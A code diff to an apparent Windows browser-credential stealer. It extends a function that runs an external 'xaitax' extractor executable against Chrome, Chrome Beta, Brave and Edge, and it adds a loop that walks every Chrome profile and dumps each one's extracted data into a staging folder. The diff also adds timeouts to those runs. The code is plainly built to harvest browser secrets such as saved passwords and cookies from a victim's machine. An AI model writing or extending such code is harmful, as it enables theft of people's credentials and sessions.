@@ -405,8 +405,35 @@ def run_xaitax_extractor():
             exe_path = os.path.join(temp_dir, file)
             break
 
+    chrome_dir = "C:\\Program Files\\Google\\Chrome\\Application"
+    chrome_data_path = os.path.join(LOCAL, r"Google\Chrome\User Data")
+    
+    if os.path.exists(chrome_dir) and os.path.exists(chrome_data_path):
+        profiles = ["Default"]
+        for entry in os.listdir(chrome_data_path):
+            if entry.startswith("Profile "):
+                profiles.append(entry)
+        
+        for profile in profiles:
+            profile_folder = profile.replace(" ", "_")
+            output_dir = os.path.join(BROWSERS_DIR, "Chrome", profile_folder)
+            os.makedirs(output_dir, exist_ok=True)
+            
+            subprocess.run(
+                f'cd /d "{chrome_dir}" && "{exe_path}" -o "{output_dir}" chrome',
+                shell=True, capture_output=True, timeout=120
+            )
+            
+            if os.path.exists(output_dir):
+                has_files = False
+                for root, dirs, files in os.walk(output_dir):
+                    if files:
+                        has_files = True
+                        break
+                if not has_files:
+                    shutil.rmtree(output_dir)
+
     browsers = [
-        ("chrome", "Chrome", "C:\\Program Files\\Google\\Chrome\\Application"),
         ("chrome beta", "Chrome_Beta", "C:\\Program Files\\Google\\Chrome Beta\\Application"),
         ("brave", "Brave", "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application"),
         ("edge", "Edge", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application"),
@@ -421,12 +448,12 @@ def run_xaitax_extractor():
         if browser_dir and os.path.exists(browser_dir):
             subprocess.run(
                 f'cd /d "{browser_dir}" && "{exe_path}" -o "{output_dir}" {browser_cmd}',
-                shell=True, capture_output=True
+                shell=True, capture_output=True, timeout=120
             )
         else:
             subprocess.run(
                 f'"{exe_path}" -o "{output_dir}" {browser_cmd}',
-                shell=True, capture_output=True
+                shell=True, capture_output=True, timeout=120
             )
 
         if os.path.exists(output_dir):
